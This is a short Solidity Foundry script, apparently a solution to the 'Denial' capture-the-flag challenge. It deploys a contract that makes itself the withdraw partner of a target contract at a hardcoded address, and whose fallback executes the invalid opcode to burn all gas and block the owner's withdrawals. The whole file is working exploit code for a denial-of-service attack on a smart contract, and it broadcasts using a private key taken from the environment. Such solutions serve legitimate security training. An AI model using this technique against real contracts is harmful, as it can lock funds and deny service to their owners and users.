//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract Hacker {
    Denial denial = Denial(payable(0xd586d4CD007Aec730abb850Fcf4DFdE1b2718497));

    constructor() {
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}

contract DenialSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hacker();
        vm.stopBroadcast();
    }
}
